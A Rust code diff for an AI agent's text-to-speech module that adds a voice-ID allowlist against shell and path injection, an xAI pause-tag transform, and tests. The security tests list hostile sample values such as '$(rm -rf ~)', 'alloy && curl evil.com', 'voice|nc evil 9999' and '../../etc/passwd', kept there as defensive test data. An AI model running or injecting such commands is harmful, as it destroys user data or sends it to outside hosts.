@@ -105,6 +105,33 @@ trait TtsProvider: Send + Sync {
     fn name(&self) -> &str;
 }
 
+/// Strict voice-ID allowlist for providers that splice `voice` into a URL
+/// path or a shell command. The LLM supplies `voice` via tool args, so this
+/// is the trust boundary that keeps a hostile `voice = "$(rm -rf ~)"` or
+/// `voice = "../admin"` out of shell/URL contexts. Providers that pass voice
+/// only inside JSON/SSML bodies (Edge, Gemini, MiniMax, xAI, Mistral, OpenAI,
+/// Piper) don't need this — `reqwest`/`serde_json` handle their escaping.
+///
+/// The character allowlist is `[A-Za-z0-9_.-]` so real-world voice names
+/// like `en-US.male.1` still pass. A separate `..` rejection closes
+/// path-traversal: `voice = ".."` would otherwise let a model pivot
+/// ElevenLabs' `/v1/text-to-speech/{voice}` to a sibling endpoint.
+fn validate_voice_id(voice: &str) -> Result<()> {
+    if voice.is_empty() {
+        bail!("voice id is empty");
+    }
+    if voice == "." || voice == ".." || voice.contains("..") {
+        bail!("invalid voice id (path-traversal pattern): {voice:?}");
+    }
+    if !voice
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+    {
+        bail!("invalid voice id: {voice:?}");
+    }
+    Ok(())
+}
+
 // ── OpenAI TTS Provider ──
 
 /// OpenAI TTS provider (POST /v1/audio/speech).
@@ -175,14 +202,7 @@ struct ElevenLabsTtsProvider {
 impl TtsProvider for ElevenLabsTtsProvider {
     async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
         let model = req.model.as_deref().unwrap_or(&self.default_model);
-        // Validate voice ID to prevent URL path traversal
-        if !req
-            .voice
-            .chars()
-            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
-        {
-            bail!("Invalid ElevenLabs voice ID: {}", req.voice);
-        }
+        validate_voice_id(&req.voice).context("ElevenLabs voice id")?;
         let url = format!("https://api.elevenlabs.io/v1/text-to-speech/{}", req.voice);
 
         let body = serde_json::json!({
@@ -533,6 +553,83 @@ struct XaiTtsProvider {
     base_url: String,
     default_voice: String,
     default_language: String,
+    /// When true, run replies through `apply_xai_auto_speech_tags`
+    /// before synthesis so Grok inserts a natural pause between the
+    /// opening sentence and the body. Off by default (raw text); flip
+    /// for conversational voice-mode replies.
+    auto_speech_tags: bool,
+}
+
+/// True if `text` already contains explicit xAI speech tags. We leave
+/// operator-marked-up text untouched so a deliberate `<whisper>...` is
+/// not stripped by the auto-cadence layer. Mirrors the recognised tag
+/// vocabulary from the reference implementation.
+fn xai_text_has_speech_tags(text: &str) -> bool {
+    // Inline tags: `[pause]`, `[laugh]`, `[breath]`, `[uh]`, `[um]`.
+    // Wrapping tags: `<whisper>...</whisper>`, `<soft>...`, `<loud>...`,
+    // `<singing>...`, `<laugh-speak>...`, `<emphasis>...`.
+    static INLINE: &[&str] = &["[pause]", "[laugh]", "[breath]", "[uh]", "[um]"];
+    static WRAPPING: &[&str] = &[
+        "<whisper",
+        "<soft",
+        "<loud",
+        "<singing",
+        "<laugh-speak",
+        "<emphasis",
+    ];
+    let lower = text.to_ascii_lowercase();
+    INLINE.iter().any(|t| lower.contains(t)) || WRAPPING.iter().any(|t| lower.contains(t))
+}
+
+/// Light cadence transform for xAI TTS replies. Conservative on purpose:
+/// it only ever *adds* `[pause]` markers around paragraph breaks and after
+/// the opening sentence. It never invents whispers or laughter, and it
+/// leaves text that already has speech tags untouched (so an operator who
+/// hand-crafts a tagged reply gets that exact rendering).
+///
+/// Mirrors the reference behavior: paragraph break → `[pause]`, single
+/// newlines collapse to spaces, then a `[pause]` after the first sentence
+/// (12–120 chars terminated by `.`/`!`/`?`/`…`). Final cleanup collapses
+/// any double-spaces the transform introduced.
+pub fn apply_xai_auto_speech_tags(text: &str) -> String {
+    let clean = text.trim();
+    if clean.is_empty() || xai_text_has_speech_tags(clean) {
+        return text.to_string();
+    }
+    // Paragraph break → explicit pause marker. `(?s)` lets `.` match any
+    // newline-inclusive whitespace run between the two `\n`s. Compile
+    // failures bubble to the caller as the unchanged text — the same
+    // degrade-rather-than-panic policy as elsewhere in this file.
+    let paragraph = match Regex::new(r"(?s)\n\s*\n+") {
+        Ok(r) => r,
+        Err(_) => return text.to_string(),
+    };
+    let single_nl = match Regex::new(r"\s*\n\s*") {
+        Ok(r) => r,
+        Err(_) => return text.to_string(),
+    };
+    // First-sentence boundary: at least 12 chars, at most 120, ending in
+    // `.`/`!`/`?`/`…` and followed by more text. The window prevents a
+    // very short greeting ("Hi.") or a wall-of-text paragraph from
+    // getting an awkward post-first-sentence pause. The `regex` crate
+    // does not support lookaheads, so we capture the following
+    // non-whitespace character into `$2` and stitch it back into the
+    // replacement — semantically identical to `\s+(?=\S)` but
+    // NFA-compatible.
+    let first_sentence = match Regex::new(r"(?s)^(.{12,120}?[.!?…])\s+(\S)") {
+        Ok(r) => r,
+        Err(_) => return text.to_string(),
+    };
+    let extra_ws = match Regex::new(r"\s{2,}") {
+        Ok(r) => r,
+        Err(_) => return text.to_string(),
+    };
+
+    let mut out = paragraph.replace_all(clean, " [pause] ").into_owned();
+    out = single_nl.replace_all(&out, " ").into_owned();
+    out = first_sentence.replace(&out, "$1 [pause] $2").into_owned();
+    out = extra_ws.replace_all(&out, " ").into_owned();
+    out.trim().to_string()
 }
 
 #[async_trait::async_trait]
@@ -545,8 +642,16 @@ impl TtsProvider for XaiTtsProvider {
         };
         let url = format!("{}/tts", self.base_url.trim_end_matches('/'));
 
+        // Apply cadence-shaping speech tags only when the operator opted
+        // in. Avoids changing the spoken output for callers that supply
+        // pre-formatted text or rely on the legacy raw behavior.
+        let text_for_synthesis: String = if self.auto_speech_tags {
+            apply_xai_auto_speech_tags(req.text)
+        } else {
+            req.text.to_string()
+        };
         let mut body = serde_json::json!({
-            "text": req.text,
+            "text": text_for_synthesis,
             "voice_id": voice,
             "language": self.default_language,
         });
@@ -821,6 +926,16 @@ fn custom_synthesize(
     use std::io::Write as _;
     use std::process::Command;
 
+    // `{voice}` is substituted into the shell template via plain string
+    // replacement before `sh -c`, so a hostile model supplying
+    // `voice = "$(rm -rf ~)"` would otherwise execute arbitrary shell.
+    // Reject anything outside the strict alphanumeric-plus-`-._` set
+    // before substitution. Empty `voice` is allowed (operator templates
+    // that don't reference `{voice}` legitimately leave it unset).
+    if !voice.is_empty() {
+        validate_voice_id(voice).context("custom TTS voice id")?;
+    }
+
     // Write text to a tempfile so commands can `cat {text_file}` without
     // shell-escaping headaches around quotes/newlines in the prose.
     let mut text_file = tempfile::NamedTempFile::new()?;
@@ -887,6 +1002,20 @@ pub struct TtsSynthesizer {
 }
 
 impl TtsSynthesizer {
+    /// Test-only constructor producing a synthesizer with no providers. Lets
+    /// downstream handler tests exercise the "all providers failed" branch
+    /// without spinning up a mock HTTP server.
+    #[cfg(test)]
+    pub(crate) fn empty_for_test() -> Self {
+        Self {
+            entries: Vec::new(),
+            default_voice: "alloy".to_string(),
+            default_format: AudioFormat::Mp3,
+            max_text_length: 4096,
+            default_timeout: Duration::from_secs(30),
+        }
+    }
+
     /// Build TTS engine from config. Returns None if disabled or no providers available.
     pub fn from_config(config: &Config) -> Option<Self> {
         if !config.tts.enabled {
@@ -1014,6 +1143,7 @@ impl TtsSynthesizer {
                     base_url: "https://api.x.ai/v1".to_string(),
                     default_voice: "eve".to_string(),
                     default_language: "en".to_string(),
+                    auto_speech_tags: model_cfg.xai_auto_speech_tags.unwrap_or(false),
                 }))
             }
             // Mistral Voxtral TTS — `/v1/audio/speech` JSON envelope.
@@ -1725,5 +1855,293 @@ mod tests {
         // mid-codepoint, the surrounding `String::from_str` would have
         // panicked. This is the explicit sanity guard.
         assert!(result.is_char_boundary(result.len()));
+    }
+
+    // ── xAI auto speech tags ──────────────────────────────────────────
+
+    /// Spec: a multi-paragraph reply gets `[pause]` markers between
+    /// paragraphs *and* one after the opening sentence (within the 12–120
+    /// char window). Single newlines collapse to spaces so the text reads
+    /// fluidly without artificial line breaks in Grok's voice.
+    #[test]
+    fn apply_xai_auto_speech_tags_adds_pause_between_paragraphs() {
+        let input =
+            "I checked the deploy logs. There are no errors.\n\nThe rollout finished cleanly.";
+        let out = apply_xai_auto_speech_tags(input);
+        // Pause after the first sentence (within window).
+        assert!(
+            out.contains("logs. [pause]"),
+            "expected post-first-sentence pause: {out}"
+        );
+        // Pause between paragraphs.
+        assert!(
+            out.contains("errors. [pause] The rollout"),
+            "expected inter-paragraph pause: {out}"
+        );
+        // No leaked double spaces.
+        assert!(!out.contains("  "), "double-space leak: {out:?}");
+    }
+
+    /// Spec: when the input already has an explicit speech tag (operator
+    /// hand-craft or earlier transform), the function returns it
+    /// untouched. Stripping tags would defeat operator intent.
+    #[test]
+    fn apply_xai_auto_speech_tags_skips_when_tags_present() {
+        let with_pause = "Hi there. [pause] How are you?";
+        assert_eq!(apply_xai_auto_speech_tags(with_pause), with_pause);
+
+        let with_whisper = "<whisper>this is a secret</whisper>";
+        assert_eq!(apply_xai_auto_speech_tags(with_whisper), with_whisper);
+    }
+
+    /// Spec: a very short reply ("Hi.") falls below the 12-char first-
+    /// sentence window — no pause inserted (would feel awkward in
+    /// playback). Empty input round-trips to empty.
+    #[test]
+    fn apply_xai_auto_speech_tags_no_op_for_short_or_empty_input() {
+        assert_eq!(apply_xai_auto_speech_tags(""), "");
+        assert_eq!(apply_xai_auto_speech_tags("   "), "   ");
+        let short = "Hi.";
+        // No pause: too short for the first-sentence rule, no paragraphs.
+        let out = apply_xai_auto_speech_tags(short);
+        assert!(!out.contains("[pause]"), "no pause expected: {out}");
+    }
+
+    /// Spec: a single very long sentence (no `.`/`!`/`?`/`…` in the
+    /// first 120 chars) gets no first-sentence pause — the heuristic
+    /// must not fire on a wall of text where it would land arbitrarily.
+    #[test]
+    fn apply_xai_auto_speech_tags_skips_first_sentence_when_too_long() {
+        let long = "This is a sentence that goes on and on without any terminator at all and just keeps running past one hundred and twenty characters of normal prose";
+        let out = apply_xai_auto_speech_tags(long);
+        assert!(!out.contains("[pause]"));
+    }
+
+    /// Spec: `xai_auto_speech_tags` is per-provider and defaults to
+    /// `false`. A `TtsModelConfig` row that omits the field must build a
+    /// provider whose `auto_speech_tags` flag is off — confirmed
+    /// indirectly by feeding tagged-looking text through `synthesize`
+    /// and asserting (via the body that *would* be sent) the input is
+    /// preserved. Here we just pin the config-default value.
+    #[test]
+    fn tts_model_config_default_xai_auto_speech_tags_is_off() {
+        use crate::config::TtsModelConfig;
+        let cfg = TtsModelConfig {
+            provider: "xai".to_string(),
+            model: None,
+            voice: None,
+            api_key_env: None,
+            timeout_ms: None,
+            name: None,
+            command: None,
+            output_extension: None,
+            xai_auto_speech_tags: None,
+        };
+        assert!(
+            !cfg.xai_auto_speech_tags.unwrap_or(false),
+            "xAI auto speech tags must default to false to preserve legacy behavior"
+        );
+    }
+
+    /// Spec: every documented TTS provider arm in `TtsSynthesizer::build_provider`
+    /// must successfully construct when its credentials are present. A drop
+    /// here means a config row referencing the provider would silently
+    /// disappear from the fallback chain — exactly the failure mode the
+    /// existing `from_config_returns_none_when_no_providers` test can't
+    /// catch because it tests the negative case only.
+    ///
+    /// Env-var names are unique per arm to avoid races with other tests
+    /// that touch the same default vars. Edge and Piper need no credentials.
+    #[tokio::test]
+    async fn from_config_builds_every_provider_arm() {
+        use crate::config::TtsModelConfig;
+        // Unique vars: prefix `BORG_TTS_ARM_` + provider suffix so this
+        // test never collides with parallel tests on the standard vars.
+        let arms: &[(&str, Option<&str>)] = &[
+            ("openai", Some("BORG_TTS_ARM_OPENAI")),
+            ("elevenlabs", Some("BORG_TTS_ARM_ELEVEN")),
+            ("edge", None),
+            ("gemini", Some("BORG_TTS_ARM_GEMINI")),
+            ("minimax", Some("BORG_TTS_ARM_MINIMAX")),
+            ("xai", Some("BORG_TTS_ARM_XAI")),
+            ("mistral", Some("BORG_TTS_ARM_MISTRAL")),
+            ("piper", None),
+            ("custom", None),
+        ];
+        for (_, var) in arms {
+            if let Some(v) = var {
+                unsafe { std::env::set_var(v, "test-key") };
+            }
+        }
+
+        let mut config = Config::default();
+        config.tts.enabled = true;
+        config.tts.models = arms
+            .iter()
+            .map(|(provider, var)| TtsModelConfig {
+                provider: (*provider).to_string(),
+                model: None,
+                voice: None,
+                api_key_env: var.map(|v| v.to_string()),
+                timeout_ms: None,
+                name: None,
+                // Only the `custom` arm requires a command template — the
+                // others ignore it. Setting it unconditionally is harmless.
+                command: Some("cp {text_file} {out_path}".to_string()),
+                output_extension: Some("wav".to_string()),
+                xai_auto_speech_tags: None,
+            })
+            .collect();
+
+        let synth = TtsSynthesizer::from_config(&config)
+            .expect("synthesizer must build with all arms present");
+        // entries is private but accessible inside the module.
+        assert_eq!(
+            synth.entries.len(),
+            arms.len(),
+            "every arm row must produce an entry — drop indicates a regression in build_provider"
+        );
+        let names: Vec<&str> = synth.entries.iter().map(|e| e.provider.name()).collect();
+        for expected in [
+            "openai",
+            "elevenlabs",
+            "edge",
+            "gemini",
+            "minimax",
+            "xai",
+            "mistral",
+            "piper",
+            "custom",
+        ] {
+            assert!(
+                names.contains(&expected),
+                "expected provider {expected} in entries, got {names:?}"
+            );
+        }
+
+        for (_, var) in arms {
+            if let Some(v) = var {
+                unsafe { std::env::remove_var(v) };
+            }
+        }
+    }
+
+    /// Spec: the custom arm requires its `command` template; a row without
+    /// one must be skipped silently (no panic, no spurious entry). Same
+    /// shape as the negative test for missing API keys on cloud providers.
+    #[test]
+    fn from_config_custom_arm_requires_command_template() {
+        use crate::config::TtsModelConfig;
+        let mut config = Config::default();
+        config.tts.enabled = true;
+        config.tts.models = vec![TtsModelConfig {
+            provider: "custom".to_string(),
+            model: None,
+            voice: Some("test".to_string()),
+            api_key_env: None,
+            timeout_ms: None,
+            name: Some("missing-command".to_string()),
+            command: None,
+            output_extension: None,
+            xai_auto_speech_tags: None,
+        }];
+        // No usable providers → from_config returns None.
+        assert!(TtsSynthesizer::from_config(&config).is_none());
+    }
+
+    /// Security regression: the custom-template TTS provider used to splice
+    /// the LLM-supplied `voice` into a `sh -c` template without validation.
+    /// A model could send `voice = "$(rm -rf ~)"` and the substituted string
+    /// would be executed by the shell. `validate_voice_id` is the trust
+    /// boundary; this table-test pins the allowed/rejected character classes.
+    #[test]
+    fn validate_voice_id_rejects_shell_metacharacters() {
+        // Accepted: alphanumerics, hyphen, underscore, dot. Real-world voice
+        // names ("en_US-lessac-medium", "alloy", "en-US.male.1") must pass.
+        for ok in [
+            "alloy",
+            "en_US-lessac-medium",
+            "Adam",
+            "en-US.male.1",
+            "voice123",
+            "A-B_C.D",
+        ] {
+            assert!(
+                validate_voice_id(ok).is_ok(),
+                "legitimate voice id rejected: {ok:?}"
+            );
+        }
+        // Rejected: every shell/URL injection vector seen in the wild,
+        // plus path-traversal patterns. `..` alone would let a model
+        // pivot ElevenLabs' `/v1/text-to-speech/{voice}` URL to the
+        // parent path — character-class allowlist alone wouldn't catch
+        // that, so there's a dedicated `..` reject branch.
+        for bad in [
+            "",
+            "$(rm -rf ~)",
+            "`whoami`",
+            "voice; rm /etc/passwd",
+            "alloy && curl evil.com",
+            "voice|nc evil 9999",
+            "../../etc/passwd",
+            "voice\nrm -rf /",
+            "voice with spaces",
+            "voice'or'1=1",
+            "voice\"quoted",
+            "voice<redirect",
+            // Path-traversal patterns: rejected even though every char
+            // is in the allowlist set.
+            ".",
+            "..",
+            "voice..suffix",
+            "..voice",
+            "voice..",
+        ] {
+            assert!(
+                validate_voice_id(bad).is_err(),
+                "injection vector accepted: {bad:?}"
+            );
+        }
+    }
+
+    /// Pre-fix, this exact call to `custom_synthesize` would have spawned
+    /// `sh -c '... $(touch /tmp/borg_pwned) ...'`. Post-fix, it must error
+    /// out *before* the `Command::new("sh")` call so the side-effect file
+    /// is never created. The assertion is on the side-effect, not the
+    /// error message, so it remains accurate if the wording changes.
+    #[test]
+    fn custom_synthesize_rejects_shell_metachars_in_voice() {
+        let canary = std::env::temp_dir().join(format!(
+            "borg_custom_tts_canary_{}.touch",
+            std::process::id()
+        ));
+        // Pre-condition: canary must not exist.
+        let _ = std::fs::remove_file(&canary);
+        assert!(!canary.exists(), "test setup: canary already exists");
+
+        let template = format!(
+            "touch {} && cp {{text_file}} {{out_path}}",
+            canary.display()
+        );
+        let injection = "$(touch /tmp/borg_pwned_should_never_appear)";
+        let res = custom_synthesize(
+            &template,
+            "hello",
+            injection,
+            "wav",
+            Duration::from_millis(500),
+        );
+        assert!(
+            res.is_err(),
+            "custom_synthesize accepted injection vector and ran the shell"
+        );
+        assert!(
+            !canary.exists(),
+            "shell command ran despite voice-id validation — security regression"
+        );
+        // Sanity: the unrelated-but-also-bad /tmp marker should not exist
+        // either. (We don't try to delete it on success because we expect
+        // it to never be created.)
+        assert!(!std::path::Path::new("/tmp/borg_pwned_should_never_appear").exists());
     }
 }
